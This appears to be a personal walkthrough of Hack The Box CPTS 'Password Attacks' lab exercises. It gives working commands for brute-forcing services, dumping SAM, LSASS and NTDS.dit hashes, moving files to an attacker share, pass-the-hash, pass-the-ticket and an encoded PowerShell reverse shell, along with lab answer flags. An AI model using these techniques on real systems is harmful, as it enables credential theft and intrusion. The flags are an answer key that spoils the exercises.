---
title: CPTS labs - 09 Password Attacks
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - certification
  - CPTS
  - labs
---
# CPTS labs - 09 Password Attacks



## [Password Attacks](https://academy.hackthebox.com/module/details/147)

### Remote Password Attacks

 **Find the user for the WinRM service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.**
 
```bash
crackmapexec winrm $ip -u username.list -p password.list    
# Results: WINRM       10.129.173.81   5985   WINSRV           [+] WINSRV\john:november (Pwn3d!)

evil-winrm -i $ip -u john -p 'november' 
type "C:\Users\john\Desktop\flag.txt"
```

Results: HTB{That5Novemb3r}



 **Find the user for the SSH service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.**
 
```bash
hydra -L username.list -P password.list ssh://$ip
# Results: [22][ssh] host: 10.129.173.81   login: dennis   password: rockstar

ssh dennis@$ip
type C:\Users\dennis\Desktop\flag.txt
```

Results: HTB{Let5R0ck1t}


Find the user for the RDP service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.
  
```bash
hydra -L ~/borrar/username.list -P ~/borrar/password.list rdp://$ip 
# Result: [3389][rdp] host: 10.129.173.81   login: chris   password: 789456123

xfreerdp /u:chris  /p:789456123 /v:$ip /cert:ignore 
# open the flag.txt in Desktop.

```

Results: HTB{R3m0t3DeskIsw4yT00easy}

**Find the user for the SMB service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.**
 
```bash
crackmapexec smb $ip -u username.list -p password.list --continue-on-success
# Results: SMB         10.129.173.81   445    WINSRV           [+] WINSRV\cassie:12345678910 

smbclient  \\\\$ip\\CASSIE -U cassie
get flag.txt
quit
cat flag.txt

```

Results: HTB{S4ndM4ndB33}  


**Create a mutated wordlist using the files in the ZIP file under "Resources" in the top right corner of this section. Use this wordlist to brute force the password for the user "sam". Once successful, log in with SSH and submit the contents of the flag.txt file as your answer.**
 
```bash
# Download the zip file and unzip it:
unzip Password-Attacks.zip

# Create a mutated list 
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list

cat mut_password.list  | grep -E '^.{11,}$' > new_mutated.list


# Evaluate open services:
sudo nmap -sC -sV 10.129.182.237 -Pn
# Results: 21 and 22

# Let's bruteforce ftp:
hydra -l sam -P new_mutated.list -t 64 ftp://10.129.182.237
# Result: [21][ftp] host: 10.129.182.237   login: sam   password: B@tm@n2022!

ssh sam$ip

cat smb/flag.txt
```

Results: HTB{P455_Mu7ations}


**Use the user's credentials we found in the previous section and find out the credentials for MySQL. Submit the credentials as the answer. (Format: `<username>:<password>)`:**

```bash
# Install creds
git clone https://github.com/ihebski/DefaultCreds-cheat-sheet.git 
cd DefaultCreds-cheat-sheet 
pip3 install defaultcreds-cheat-sheet        

# search for default password
creds search mysql  

# Ssh to the host and try the default passwords
ssh sam@$ip
# Enter password: B@tm@n2022!

# Enter Mysql with one of the default password
mysql -u superdba -padmin
```

Results: superdba:admin


### Windows Local Password Attacks


**Where is the SAM database located in the Windows registry? (Format: **\*)**
Results: hklm\sam

 RDP to  with user "Bob" and password "HTB_@cademy_stdnt!". Apply the concepts taught in this section to obtain the password to the ITbackdoor user account on the target. Submit the clear-text password as the answer.
 
```
# Connect to the machine

# Launching CMD as an admin will allow us to run reg.exe to save copies of the registry hives.
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save

# From your kali attacking machine, mount a smb share
python3 ./impacket/examples/smbserver.py -smb2support CompData /home/lala/borrar

# From the victim's machine (windows), moves the registries to your attacking machine
move sam.save \\$ipAttacker\CompData
move system.save \\$ipAttacker\CompData
move security.save \\$ipAttacker\CompData

# Dumping Hashes with Impacket's secretsdump.py
python3 ./impacket/examples/secretsdump.py -sam ~/borrar/sam.save -security ~/borrar/security.save -system ~/borrar/system.save LOCAL

# Results:
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
# Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
# DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
# WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5a015220f8de34e:::
# bob:1001:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
# jason:1002:aad3b435b51404eeaad3b435b51404ee:a3ecf31e65208382e23b3420a34208fc:::
# ITbackdoor:1003:aad3b435b51404eeaad3b435b51404ee:c02478537b9727d391bc80011c2e2321:::
# frontdesk:1004:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::

# Running hascat
sudo hashcat -m 1000 c02478537b9727d391bc80011c2e2321 /usr/share/wordlists/rockyou.txt 
```

```
# Another way to do it is running crackmapexec from the attacking machine:
crackmapexec smb $ip --local-auth -u bob -p HTB_@cademy_stdnt! --sam  
```

Results:  matrix


**RDP to  with user "Bob" and password "HTB_@cademy_stdnt!". Dump the LSA secrets on the target and discover the credentials stored. Submit the username and password as the answer. (Format: username:password, Case-Sensitive)**

```
crackmapexec smb $ip --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```

Results: frontdesk:Password123

**What is the name of the executable file associated with the Local Security Authority Process?**

Results:  lsass.exe

**RDP to  with user "htb-student" and password "HTB_@cademy_stdnt!". Apply the concepts taught in this section to obtain the password to the Vendor user account on the target. Submit the clear-text password as the answer. (Format: Case sensitive)**

```
# `Open Task Manager` > `Select the Processes tab` > `Find & right click the Local Security Authority Process` > `Select Create dump file`. It's created under:
 C:\Users\HTB-ST~1\AppData\Local\Temp\lsass.DMP
 
# From our kali we mount a shared unit
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData ~/borrar   

# From the RDP connection open a powershell with Admin rights:
move C:\Users\HTB-ST~1\AppData\Local\Temp\lsass.DMP  \\$ipKali$\CompData

# Crack the lsass file withPypykatz
pypykatz lsa minidump ~/borrar/lsass.DMP 
```

We obtain the following:

```
== LogonSession ==
authentication_id 123625 (1e2e9)
session_id 0
username Vendor
domainname FS01
logon_server FS01
logon_time 2025-01-17T21:20:58.864952+00:00
sid S-1-5-21-2288469977-2371064354-2971934342-1003
luid 123625
	== MSV ==
		Username: Vendor
		Domain: FS01
		LM: NA
		NT: 31f87811133bc6aaa75a536e77f64314
		SHA1: 2b1c560c35923a8936263770a047764d0422caba
		DPAPI: 0000000000000000000000000000000000000000
	== WDIGEST [1e2e9]==
		username Vendor
		domainname FS01
		password None
		password (hex)
	== Kerberos ==
		Username: Vendor
		Domain: FS01
	== WDIGEST [1e2e9]==
		username Vendor
		domainname FS01
		password None
		password (hex)
```

Then we use hashcat:

```bash
 hashcat -m 1000 31f87811133bc6aaa75a536e77f64314 /usr/share/wordlists/rockyou.txt 
```

Results: Mic@123

**What is the name of the file stored on a domain controller that contains the password hashes of all domain accounts? (Format: **.*)**

Resutls: ntds.dit


**Submit the NT hash associated with the Administrator user from the example output in the section reading.**

The answer is in the reading materials.

Results: 64f12cddaa88057e06a81b54e73b949b


**On an engagement you have gone on several social media sites and found the Inlanefreight employee names: John Marston IT Director, Carol Johnson Financial Controller and Jennifer Stapleton Logistics Manager. You decide to use these names to conduct your password attacks against the target domain controller. Submit John Marston's credentials as the answer. (Format: username:password, Case-Sensitive)**

```bash
# The reading materials reveals the use of the /usr/share/wordlists/fasttrack.txt. We get it from here: https://github.com/drtychai/wordlists/blob/master/fasttrack.txt
# Create a list of original names called original.txt with:
John Marston
Carol Johnson
Jennifer Stapleton

# Use username Anarchy to obtain combinations of these names for usual username formats:
git clone https://github.com/urbanadventurer/username-anarchy.git
cd username-anarchy
./username-anarchy -i ~/borrar/original.txt 

# Save these names under usernames.txt
# Enumerate services
 sudo nmap -sC -sV $ip -Pn 

# Run a password attack:
crackmapexec winrm $ip -u ~/borrar/usernames.txt -p /usr/share/wordlists/fasttrack.txt --sam

# Results:
SMB         10.129.202.85   445    ILF-DC01         [+] ILF.local\jmarston:P@ssword! (Pwn3d!)

```

Results: jmarston:P@ssword!


 Capture the NTDS.dit file and dump the hashes. Use the techniques taught in this section to crack Jennifer Stapleton's password. Submit her clear-text password as the answer. (Format: Case-Sensitive)

```bash
# Alternative 1: crackmapexec
crackmapexec smb $ip-u jmarston -p P@ssword! --ntds 

# Crack the hash
hashcat -m 1000 92fd67fd2f49d0e83744aa82363f021b /usr/share/wordlists/rockyou.txt 
```

```
#  Alternative 2

# 1. Connecting to a DC with Evil-WinRM
evil-winrm -i $ip -u jmarston -p 'P@ssword!'

# 2. Checking Local Group Membership
net localgroup

# 3. Checking User Account Privileges including Domain
net user $username

# 4. Creating Shadow Copy of C: 
vssadmin CREATE SHADOW /For=C:
# Results:
# Successfully created shadow copy for 'C:\'
      Shadow Copy ID: {0480243a-8bf0-4af9-a5f5-4a842e49d6c3}
    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1

# 5. Copying NTDS.dit from the VSS
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit c:\NTDS.dit


# 6. We will also need either the SYSTEM hive or bootkey is required for local parsing. So let's save the system hive
reg.exe save hklm\system C:\system.save

# 7. Transfer file to attacking machine. For that I will set up a shared unit in the attacker machine:
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData ~/borrar/

# 8. Copy the file from the victim's machine (windows)
cmd.exe /c move C:\NTDS.dit \\10.10.15.90\CompData
cmd.exe /c move c:\system.save \\10.10.15.90\CompData

# Extract the NTDS.dit file and crack it with secretsdump:
python ~/tools/impacket/examples/secretsdump.py -ntds ~/borrar/NTDS.dit  -system ~/borrar/system.save -hashes lmhash:nthash LOCAL -outputfile ntlm-extract

# Results:
[*] Reading and decrypting hashes from /home/lala/borrar/NTDS.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
ILF-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:8af61f67a96ac6fb352f192b1cfc6b56:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cfa046b90861561034285ea9c3b4af2f:::
ILF.local\jmarston:1103:aad3b435b51404eeaad3b435b51404ee:2b391dfc6690cc38547d74b8bd8a5b49:::
ILF.local\cjohnson:1104:aad3b435b51404eeaad3b435b51404ee:5fd4475a10d66f33b05e7c2f72712f93:::
ILF.local\jstapleton:1108:aad3b435b51404eeaad3b435b51404ee:92fd67fd2f49d0e83744aa82363f021b:::
ILF.local\gwaffle:1109:aad3b435b51404eeaad3b435b51404ee:07a0bf5de73a24cb8ca079c1dcd24c13:::
LAPTOP01$:1111:aad3b435b51404eeaad3b435b51404ee:be2abbcd5d72030f26740fb531f1d7c4:::
[*] Kerberos keys from /home/lala/borrar/NTDS.dit 
Administrator:aes256-cts-hmac-sha1-96:a2bfeccd55aca0e53f893d1ae43abcdf0d6aa5793cd5d2dbe8c6f577cbbe5a35
Administrator:aes128-cts-hmac-sha1-96:84a147160d42613b0ffe0bd060dbca9c
Administrator:des-cbc-md5:3ec8540110d3e058
ILF-DC01$:aes256-cts-hmac-sha1-96:50d1401419bf8fe68aa149e67f327af59fc923653e3ebe212345883a3b92bb2d
ILF-DC01$:aes128-cts-hmac-sha1-96:f16761d510325e2640b31a9ef9e5350a
ILF-DC01$:des-cbc-md5:f20b1ae0e0f2986b
krbtgt:aes256-cts-hmac-sha1-96:4c3efde4c6ef4005e67a3d9aa09d91d9325518443e54a914f83839a2ed7d02ec
krbtgt:aes128-cts-hmac-sha1-96:69ef62ae6a467bca3e3aa07495b81a64
krbtgt:des-cbc-md5:6e1fa8f219daa82c
ILF.local\jmarston:aes256-cts-hmac-sha1-96:9e7d0ec693ff443437aae379ee87d07ed42d6745a4eab784eaa54ceff2fa2649
ILF.local\jmarston:aes128-cts-hmac-sha1-96:b106cf089340b2e610710d6a89ea890d
ILF.local\jmarston:des-cbc-md5:5e5dc24ff73ee9a8
ILF.local\cjohnson:aes256-cts-hmac-sha1-96:2d332798b58ed1a9611e2ecabb338aec01fab4519b08ce4986ebc405c851d7fc
ILF.local\cjohnson:aes128-cts-hmac-sha1-96:cf66ade75cbc1c17d55d6abae64a77f3
ILF.local\cjohnson:des-cbc-md5:83f8cbe3386d858a
ILF.local\jstapleton:aes256-cts-hmac-sha1-96:bf06c080a3e7975799a9f58b606fef8a4b2c4f574cb9e7e99c0686971850ca64
ILF.local\jstapleton:aes128-cts-hmac-sha1-96:828fbbc322f3929f1fe164bcae50e310
ILF.local\jstapleton:des-cbc-md5:d057ad893d8a6b2f
ILF.local\gwaffle:aes256-cts-hmac-sha1-96:b3a7e81c743c8457ba643a5c63058af6f8d21f2a71c793ff7058e73f82ff45a0
ILF.local\gwaffle:aes128-cts-hmac-sha1-96:76943b80314d6f172ed66bb7a4ed72ad
ILF.local\gwaffle:des-cbc-md5:8668a2d073764a3e
LAPTOP01$:aes256-cts-hmac-sha1-96:e0b95703b96705adaf6b5ddadb1f9896729e75683e99f55a6c7bf31e32c3a6d0
LAPTOP01$:aes128-cts-hmac-sha1-96:f42fef661ee76d7e5d2062443e569d5d
LAPTOP01$:des-cbc-md5:26ade5ce709bb5e5

# Crack the hashes
# For AES256-CTS-HMAC-SHA1-96

```

Results: Winter2008


**RDP to  with user "Bob" and password "HTB_@cademy_stdnt!" What password does Bob use to connect to the Switches via SSH? (Format: Case-Sensitive)**

```bash
# Open the excel file under C:\Users\bob\Desktop\WorkStuff\Creds
# Results: admin:WellConnected123
# bwilliamson:P@55w0rd!
```

Results: WellConnected123


**RDP to  with user "Bob" and password "HTB_@cademy_stdnt!". What is the GitLab access code Bob uses? (Format: Case-Sensitive)**

```bash
# Open the folder WorkStuff available in desktop and open the file GitlabAccessCodeJustIncase
```

Results: 3z1ePfGbjWPsTfCsZfjy


**RDP to  with user "Bob" and password "HTB_@cademy_stdnt!". What credentials does Bob use with WinSCP to connect to the file server? (Format: username:password, Case-Sensitive)**

```bash
# Copy lazagne to the windows machine. For instance, to Bob's Desktop and run it
start .\lazagne.exe all
# [+] Password found !!!
# URL: 10.129.202.64
# Login: ubuntu
# Password: FSadmin123
# Port: 22     
```

Results: ubuntu:FSadmin123


**RDP to  with user "Bob" and password "HTB_@cademy_stdnt!".  What is the default password of every newly created Inlanefreight Domain user account? (Format: Case-Sensitive)**

```bash
# Alternative 1:
Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password|pwd|pass"

# Alternative 2:
 Querying patterns of files with findstr
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml

# The first result we obtain is c:\Automations&Scripts\BulkaddADusers.ps1
type 'C:\Automations&Scripts\BulkaddADusers.ps1'
# And we check that the default password is set to Inlanefreightisgreat2022
```

Results: Inlanefreightisgreat2022


**RDP to  with user "Bob" and password "HTB_@cademy_stdnt!". What are the credentials to access the Edge-Router? (Format: username:password, Case-Sensitive)**

```
# We search the string Edge-Router
Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "Edge-Router"

# We obtain as results:
Automations&Scripts\AnsibleScripts\EdgeRouterConfigs

# We open that file and retrieve username and password
edgeadmin:Edge@dmin123!
```

Results: edgeadmin:Edge@dmin123!


### Linux Local Password Attacks

**Examine the target and find out the password of the user Will. Then, submit the password as the answer.**

```bash
# Enumerate services
sudo nmap -sC -sV ~ip -Pn
# We obtain open services: ftp, ssh and smb

# The hint offers us the creds: Kira:LoveYou1. However they do not work on the existing services. We need to mutate a little the password list provided by HTB in resources.
echo LoveYou1 > originalpass.txt
hashcat --force originalpass.txt -r custom.rule --stdout | sort -u > mutatedlist.list

# Now we launch our attack:
hydra -l kira -P mutatedlist.list ssh://$ip
# Results: [22][ssh] host: 10.129.229.2   login: kira   password: L0vey0u1!

ssh kira@$ip
# Enter the password: L0vey0u1!

# Serve the  firefox_decrypt.py from your kali
python3 -m http.server 8001

# Download it into the target machine
wget http://$IPAtacker:8001/firefox_decrypt.py

# Now run it:
python3.9 firefox_decrypt.py
# Results:
# Website:   https://dev.inlanefreight.com
# Username: 'will@inlanefreight.htb'
# Password: 'TUqr7QfLTLhruhVbCP'

```

Results: TUqr7QfLTLhruhVbCP

**Examine the target using the credentials from the user Will and find out the password of the "root" user. Then, submit the password as the answer.**

```
# After browsing the file system we notice files passwd.bak and shadow.bak under /home/will/.backups/. We will try to unshadow those files, but for that we need to transfer them to our attacker machine. 

# We will use uploadserver. In our attacker machine, as we will use https, we will create a self-signed certificate.
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

#  The webserver should not host the certificate. We create a new directory to host the file for our webserver.
mkdir https && cd https

# We start the web server in out attacker machine
python3 -m uploadserver 443 --server-certificate ~/borrar/server.pem

# Now from our compromised machine, let's upload the   `passwd.bak` and `shadow.bak`  files.
curl -X POST http://$ipAttackerMachine/upload -F 'files=@/home/will/.backups/passwd.bak' -F 'files=@/home/will/.backups/shadow.bak' --insecure
# We used the option --insecure because we used a self-signed certificate that we trust.

# Now we unshadow those files:
unshadow passwd.bak shadow.bak > unshadowed.hashes

# And crack them:
hashcat -m 1800 -a 3 unshadowed.hashes /usr/share/wordlists/rockyou.txt -o unshadowed.cracked
```

Results: J0rd@n5

### Windows Lateral Movement


**Authenticate to  with user "Administrator" and password "30B3783CE2ABF1AF70F77D0660CF3453". Access the target machine using any Pass-the-Hash tool. Submit the contents of the file located at C:\pth.txt.**

```powershell
xfreerdp /u:Administrator /pth:30B3783CE2ABF1AF70F77D0660CF3453 /v:$ip
impacket-psexec Administrator@$ip -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```

Results: `G3t_4CCE$$_V1@_PTH`



**Try to connect via RDP using the Administrator hash. What is the name of the registry value that must be set to 0 for PTH over RDP to work? Change the registry key value and connect using the hash with RDP. Submit the name of the registry value name as the answer.**

```powershell
# When trying to access with
xfreerdp /u:Administrator /pth:30B3783CE2ABF1AF70F77D0660CF3453 /v:$ip
# we obtained an error message as it was in Restricted Admin Mode. In the connection we already have we change the registry
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

# And now we can access viar RDP
```

Results: DisableRestrictedAdmin



**RDP to with user "Administrator" and password "30B3783CE2ABF1AF70F77D0660CF3453". Connect via RDP and use Mimikatz located in c:\tools to extract the hashes presented in the current session. What is the NTLM/RC4 hash of David's account?**

```powershell
 .\mimikatz.exe privilege::debug "sekurlsa::logonPasswords full" exit  
```

Results: c39f2beb3d2ec06a62cb887fb391dee0



**Using David's hash, perform a Pass the Hash attack to connect to the shared folder \\DC01\david and read the file david.txt.**

```powershell
# Alternative #1: mimikatz
# From the RDP connection we have, from powershell terminal:
.\mimikatz.exe privilege::debug "sekurlsa::pth /user:david /NTLM:c39f2beb3d2ec06a62cb887fb391dee0 /domain:inlanefreight.htb /run:cmd.exe" exit     

# A terminal cmd.exe opens. Run
dir \\DC01\david
type \\DC01\david\david.txt
```

Results: D3V1d_Fl5g_is_Her3



**Using Julio's hash, perform a Pass the Hash attack to connect to the shared folder \\DC01\julio and read the file julio.txt.**

```powershell
# Alternative #1: mimikatz
# From the RDP connection we have, from powershell terminal:
.\mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /NTLM:64f12cddaa88057e06a81b54e73b949b /domain:inlanefreight.htb /run:cmd.exe" exit  

# A terminal cmd.exe opens. Run
dir \\DC01\julio
type \\DC01\julio\julio.txt
```

Results: JuL1()_SH@re_fl@g



**Using Julio's hash, perform a Pass the Hash attack, launch a PowerShell console and import Invoke-TheHash to create a reverse shell to the machine you are connected via RDP (the target machine, DC01, can only connect to MS01). Use the tool nc.exe located in c:\tools to listen for the reverse shell. Once connected to the DC01, read the flag in C:\julio\flag.txt.**

```powershell
# We wnumerate the possible IPs for DC fron our RDP connection
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}
# It might be 172.16.1.10

# In the running RDP connection we have we will open a powershell terminal as julio, by using mimikatz and a passthehash
.\mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /NTLM:64f12cddaa88057e06a81b54e73b949b /domain:inlanefreight.htb /run:powershell.exe" exit  

# We will do the same to have a cmd.exe running as julio
.\mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /NTLM:64f12cddaa88057e06a81b54e73b949b /domain:inlanefreight.htb /run:cmd.exe" exit  

# In the cmd.exe we will browse to tools and set a netcat listener on port 1234

# In the powershell terminal, browse to tools
cd c:\tools\Invoke-TheHash
Import-Module .\Invoke-TheHash.psd1

# We will launch the InvoketheHash with a reverse shell
Invoke-SMBExec -Target 172.16.1.10 -Domain inlafreight.htb -Username julio -Hash 64f12cddaa88057e06a81b54e73b949b -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA3ADIALgAxADYALgAxAC4ANQAiACwAMQAyADMANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=" -Verbose

# In the cmd terminal we have obtained a reverse shell. Print the flag:
type C:\julio\flag.txt
```

Results: JuL1()_N3w_fl@g



**Optional: John is a member of Remote Management Users for MS01. Try to connect to MS01 using john's account hash with impacket. What's the result? What happen if you use evil-winrm?. Mark DONE when finish.**

```powershell
impacket-psexec john@$ip -hashes :c4b0e1b10c7ce2c4723b4e2407ef81a2
evil-winrm -i $ip -u john -H 'c4b0e1b10c7ce2c4723b4e2407ef81a2'
```

Results: DONE


**RDP to with user "Administrator" and password `AnotherC0mpl3xP4$$`.  Connect to the target machine using RDP and the provided creds. Export all tickets present on the computer. How many users TGT did you collect?**

```powershell
# Open a Powershell with admin rights.
cd c:\tools
.\mimikatz.exe
privilege::debug
sekurlsa::tickets /list
sekurlsa::tickets /export


john
TGT [0;5a62c]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi !
 Session Key       : 0x00000012 - aes256_hmac
             1d9ac815d1fc7dfb7a1a8d3088cbd3bb1d33987c4707f3a315c350150b61ebb0
             
julio
TGT  [0;59c14]-2-0-40e10000-julio@krbtgt-INLANEFREIGHT.HTB.kirbi !
Session Key       : 0x00000012 - aes256_hmac
             ea463b091f018b64ba502d50c220ff8e6894e96e0d70263078c01df3c81d2410


david
 Session Key       : 0x00000012 - aes256_hmac
             dc35cd440cc4c4d93ba02c430e0144f61804827c95a6265ac15a720984436d10
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;5af56]-2-0-40e10000-david@krbtgt-INLANEFREIGHT.HTB.kirbi !
```

Results: 3

Use john's TGT to perform a Pass the Ticket attack and retrieve the flag from the shared folder `\\DC01.inlanefreight.htb\john`


```powershell
# From the powershell session open in last question:
# Pass the ticket with mimikatz
.\mimikatz.exe
privilege::debug
kerberos::ptt "C:\tools\[0;5a62c]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
exit

# Enter a remote session
Enter-PSSession -ComputerName DC01

# Entering the shared unit 
cd \\DC01.inlanefreight.htb\john

# Reading the flag
type john.txt
```

Results: Learn1ng_M0r3_Tr1cks_with_J0hn

**Use john's TGT to perform a Pass the Ticket attack and connect to the DC01 using PowerShell Remoting. Read the flag from C:\john\john.txt**

```powershell
# Extract keys
Rubeus.exe dump /nowrap

# Creates a sacrificial process/logon session (Logon type 9). This will open a new terminal window.
.\Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show


# In the new terminal window import the ticket with Rubeus
.\Rubeus.exe ptt /ticket:doIFqDCCBaSgAwIBBaEDAgEWooIEojCCBJ5hggSaMIIElqADAgEFoRMbEUlOTEFORUZSRUlHSFQuSFRCoiYwJKADAgECoR0wGxsGa3JidGd0GxFJTkxBTkVGUkVJR0hULkhUQqOCBFAwggRMoAMCARKhAwIBAqKCBD4EggQ6czbmRrrk3Aah8tt1z57sIb9++eXZnVGldPnts7c+91NcpdsnRfoqueyM9PBc/o2XIzFdWmfrAbYbs3RGKjwI91tnlqs3ubMyvVSp9sW+7oMNgOyWeG7SVqHQVFmb6CQ723liVYf0goXaei1MUTFtyY6uiTYTS7h6SVxmXDyo2Ei34hviUdoJccJw21JMctBtoTfKGNNAgLzh9Va4DyAbdjr8RoyK99FcREcww1jrLmaIiuqQ4SQcK39fmvhinKJ2ONQ4D6X5g1L16cPNcKee07IZ/996NS3UqsMFou8BYzySmBj9JBN0sqSmKLaW+HdoX55ixnEGO/SzmgTfHHW9dbvZflfzMCB/TDih5SlTEYTAfW+g1DXI0o1YMUNRz3IxYPUy/OMqNQLbERmrcHt9fkgh0DlMfg94lcAM93To6Z0L7XtFYQF2i73J+o5i099P/a8381q7X0KWrZ+7lPnZbyks6J+jEY/wgKNAP8E16HPQVXDvtu4cbamEsp3VHq8yZ92JiA0GSJrqxCwF13eeYNUaL8Yf6GdSKE9KM72q5VGHyvlbeOmL0zIB8YR/HHl3ZfNQW8V48u4RoOBS+pXKq9UF7xrlh6rl1N01Nsgos58FOWzVncLRoheOez8rTxA44kgIz5RVVINRqBZj/k226t0OjAmk/hZQtbUQ5EH1/KuztL+3lver7nzlpS2IwbfWD9ScxMHwR8PImz0w3kcsfB8VYX9DSHNOUwhOB5QuBH+Oc67IQoMUTHCpLgWY+kNNj+yWu/2QDBvHKVuHpIh1+D4nEXCTOMKs42ZVsK6rmzpFM3C8eARj83zreW68HUTiZJBWwkdk6v/4BuZNT0xp8mIf/LzneGSdZIELO5B1MJbFaKs/JcsdRtjdv2LfGaXp9MwuQ3xRCkTPUjJNERwGyw87xQhqfNxwpGXJIlWaTFMKqcFC7VDRLsSEbNIinrIRjiX4tvBNfnNgxWGG2YFCDPz/23vUuRCfxOnmd7SWLrIUY9g6uzdGCNfxN2zEj1gQgaXfjucouF7xw+JwMZ1go7CNXxfKyk5t+uzgEJY7jWbQO17zamD1EIIQNEsXI403KXfJsUo/aaKIpeW4EkUbVBHwv5gOPmRKpfsSG1aXMYH40G151RJXW/86h4kYB0C+h41I5EizwIjzUJBp6VPmoNZlJcFgPNcZOAy4q7O+ubFepmnkE3gZBmTd5qvqH51ckz9/l6DqrkyvPUYOS0hWLA27Z7n0HOxhxgs7xInIsdf/YpZ5cnLFBgzTasFxmjAofIVtomvc7PeMtwVyHaqJggIT0mV1/SnEwriWucerepLen2nBnU6ezqbiJqpBOOKqGuyftYkCnFXWjYQf3nkkWR3ULi/WpjNPlnusTWUUHHzLy9jHGVGmyO8CodQs6j5YkI6RjMi88UXR1CIZtMuCao0na3e73ujX2FyjgfEwge6gAwIBAKKB5gSB432B4DCB3aCB2jCB1zCB1KArMCmgAwIBEqEiBCAdmsgV0fx9+3oajTCIy9O7HTOYfEcH86MVw1AVC2HrsKETGxFJTkxBTkVGUkVJR0hULkhUQqIRMA+gAwIBAaEIMAYbBGpvaG6jBwMFAEDhAAClERgPMjAyNTAxMTkwODQ3MDJaphEYDzIwMjUwMTE5MTg0NzAyWqcRGA8yMDI1MDEyNjA4NDcwMlqoExsRSU5MQU5FRlJFSUdIVC5IVEKpJjAkoAMCAQKhHTAbGwZrcmJ0Z3QbEUlOTEFORUZSRUlHSFQuSFRC

# Enter a remote session
